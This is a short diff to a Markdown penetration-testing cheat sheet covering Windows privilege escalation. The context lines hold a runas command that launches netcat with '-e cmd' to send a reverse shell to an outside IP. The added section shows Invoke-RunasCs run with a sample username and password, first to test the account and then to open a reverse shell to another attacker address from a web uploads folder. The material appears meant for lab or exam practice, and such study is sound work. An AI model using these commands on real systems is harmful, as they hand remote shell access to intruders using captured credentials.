@@ -100,6 +100,20 @@ runas /user:administrator "cmd.exe /c whoami > whoami.txt"
 runas /user:administrator "nc.exe -e cmd 192.168.45.243 445"
 ```
 
+#### ➤ Invoke-RunasCs (powershell)
+
+Script : https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
+
+```
+PS C:\xampp\htdocs\uploads> Import-module Invoke-RunasCs.ps1
+
+Test user : 
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
+
+Reverse shell :
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.49.55:443
+```
+
 
 ## 🔻Single line Webshell
 
